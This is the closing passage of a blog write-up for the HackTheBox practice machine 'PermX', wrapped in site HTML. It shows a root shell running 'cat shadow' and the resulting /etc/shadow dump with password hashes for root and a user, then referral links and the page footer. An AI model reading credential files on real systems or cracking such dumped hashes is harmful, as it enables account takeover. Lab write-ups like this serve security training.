+<h2 id="Hashes"><a href="#Hashes" class="headerlink" title="Hashes"></a>Hashes</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">root@permx:/etc<span class="comment"># cat shadow</span></span><br><span class="line">root:$y$j9T<span class="variable">$VEMcaSLaOOvSE3mYgRXRv</span>/<span class="variable">$tNXYdTRyCAkwoSHhlyIoCS91clvPEp</span>/hh0r4NTBlmS7:19742:0:99999:7:::</span><br><span class="line">daemon:*:19579:0:99999:7:::</span><br><span class="line">bin:*:19579:0:99999:7:::</span><br><span class="line">sys:*:19579:0:99999:7:::</span><br><span class="line"><span class="built_in">sync</span>:*:19579:0:99999:7:::</span><br><span class="line">games:*:19579:0:99999:7:::</span><br><span class="line">man:*:19579:0:99999:7:::</span><br><span class="line">lp:*:19579:0:99999:7:::</span><br><span class="line">mail:*:19579:0:99999:7:::</span><br><span class="line">news:*:19579:0:99999:7:::</span><br><span class="line">uucp:*:19579:0:99999:7:::</span><br><span class="line">proxy:*:19579:0:99999:7:::</span><br><span class="line">www-data:*:19579:0:99999:7:::</span><br><span class="line">backup:*:19579:0:99999:7:::</span><br><span class="line">list:*:19579:0:99999:7:::</span><br><span class="line">irc:*:19579:0:99999:7:::</span><br><span class="line">gnats:*:19579:0:99999:7:::</span><br><span class="line">nobody:*:19579:0:99999:7:::</span><br><span class="line">_apt:*:19579:0:99999:7:::</span><br><span class="line">systemd-network:*:19579:0:99999:7:::</span><br><span class="line">systemd-resolve:*:19579:0:99999:7:::</span><br><span class="line">messagebus:*:19579:0:99999:7:::</span><br><span class="line">systemd-timesync:*:19579:0:99999:7:::</span><br><span class="line">pollinate:*:19579:0:99999:7:::</span><br><span class="line">sshd:*:19579:0:99999:7:::</span><br><span class="line">syslog:*:19579:0:99999:7:::</span><br><span class="line">uuidd:*:19579:0:99999:7:::</span><br><span class="line">tcpdump:*:19579:0:99999:7:::</span><br><span class="line">tss:*:19579:0:99999:7:::</span><br><span class="line">landscape:*:19579:0:99999:7:::</span><br><span class="line">fwupd-refresh:*:19579:0:99999:7:::</span><br><span class="line">usbmux:*:19742:0:99999:7:::</span><br><span class="line">mtz:$y$j9T$RUjBgvOODKC9hyu5u7zCt0<span class="variable">$Vf7nqZ4umh3s1N69EeoQ4N5zoid6c2SlGb1LvBFRxSB</span>:19742:0:99999:7:::</span><br><span class="line">lxd:!:19742::::::</span><br><span class="line">mysql:!:19742:0:99999:7:::</span><br></pre></td></tr></table></figure>
+
+<p>‍</p>
+<h1 id="Thanks"><a href="#Thanks" class="headerlink" title="Thanks"></a>Thanks</h1><p><strong>Respect</strong>: If my writeup really helps you, <a target="_blank" rel="noopener" href="https://app.hackthebox.com/users/463126">Give me a respect</a> to let me know， Thankssssss!</p>
+
+    <iframe src="/maneplugin/badge/htb.html" style="border:none; height: 70px" title="description"></iframe>
+
+
+<p><strong>Beginner Recommand</strong>: <a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8fyQS">If you are a beginner, please use this link to sign up for an HTB Academy to get more Higher level of knowledge.</a></p>
+<p><strong>新手非常推薦</strong>: <a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8fyQS">如果你是初學者，可以用此鏈接來嘗試注冊 HTB Academy 賬號。</a></p>
+<p>使用上面的鏈接加入 HTB 的 academy 就可以免費看 Tire 0 的所有教程，這對初學者來説是很友好的。 （建議先完成 INTRODUCTION TO ACADEMY）</p>
+<p>Join HTB’s academy with this link to get free access to all the tutorials for Tire 0. This is very beginner friendly. (It is recommended to complete INTRODUCTION TO ACADEMY first)</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <script>
+        setTimeout(() => {
+          makeList({
+             'target': '#toc-mobile',   // Selector for element to place table of contents
+             'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+          });
+        }, 1000);
+      </script>
+    
+    <div id="toc-footer" style="display: none">
+      <div id="toc-mobile"></div>
+    </div>
+
+    <style>
+        #toc-mobile {
+        }
+        #toc-mobile ul {
+           display: grid ! important;
+        }
+        #toc-mobile li {
+           margin: 0 0 0 0 ! important;
+        }
+        #toc-mobile .level-1 {
+           color: #00b4dd ;
+        }
+        #toc-mobile .level-2 {
+           color: #2bbc8a;
+        }
+        #toc-mobile .level-3 {
+           color: #40474b;
+        }
+        #toc-mobile .level-4, #toc-mobile .level-5, #toc-mobile .level-6 {
+           color: #8c8c8c;
+        }
+    </style>
+
+
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://manesec.github.io/2024/07/07/2024-htb-machine/27-PermX/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://manesec.github.io/2024/07/07/2024-htb-machine/27-PermX/&text=HackTheBox - Machine - PermX"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://manesec.github.io/2024/07/07/2024-htb-machine/27-PermX/&title=HackTheBox - Machine - PermX"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://manesec.github.io/2024/07/07/2024-htb-machine/27-PermX/&is_video=false&description=HackTheBox - Machine - PermX"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HackTheBox - Machine - PermX&body=Check out this article: https://manesec.github.io/2024/07/07/2024-htb-machine/27-PermX/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://manesec.github.io/2024/07/07/2024-htb-machine/27-PermX/&title=HackTheBox - Machine - PermX"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://manesec.github.io/2024/07/07/2024-htb-machine/27-PermX/&title=HackTheBox - Machine - PermX"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://manesec.github.io/2024/07/07/2024-htb-machine/27-PermX/&title=HackTheBox - Machine - PermX"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://manesec.github.io/2024/07/07/2024-htb-machine/27-PermX/&title=HackTheBox - Machine - PermX"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://manesec.github.io/2024/07/07/2024-htb-machine/27-PermX/&name=HackTheBox - Machine - PermX&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://manesec.github.io/2024/07/07/2024-htb-machine/27-PermX/&t=HackTheBox - Machine - PermX"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+      
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+  
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2024
+    manesec
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- Add space -->
+<script src="https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js"></script>
+<script>
+  document.addEventListener('DOMContentLoaded', () => {
+    // listen to any DOM change and automatically perform spacing via MutationObserver()
+    pangu.autoSpacingPage();
+  });
+</script>
+
+<!-- fancybox support -->
+
+       <script type="text/javascript" src="/js/fancybox/jquery.fancybox.min.js"></script>
+       <script type="text/javascript" src="/js/wrapImage.js"></script>
+   
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+
+</body>
+</html>
